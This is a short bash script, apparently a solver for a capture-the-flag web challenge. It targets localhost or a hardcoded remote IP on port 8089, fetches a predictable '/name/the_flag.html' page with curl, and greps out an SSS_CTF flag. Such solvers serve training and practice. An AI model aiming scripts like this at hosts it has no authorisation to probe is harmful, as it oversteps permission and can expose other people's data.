#!/bin/bash
PORT=8089

if [[ $1 == "local" ]]
then
    remote='http://127.0.0.1:'$PORT
elif [[ $1 == "remote" ]] && [[ -z $2 ]] 
then
    remote='http://141.85.224.118:'$PORT
else
    remote=$1':'$2
fi

# Name
echo "Start exploit for Name"
remote=$remote'/name/'
flag=$(curl -s $remote'the_flag.html' | grep -o "SSS_CTF{.*}")
echo "Flag is $flag"
echo "----------------------------"
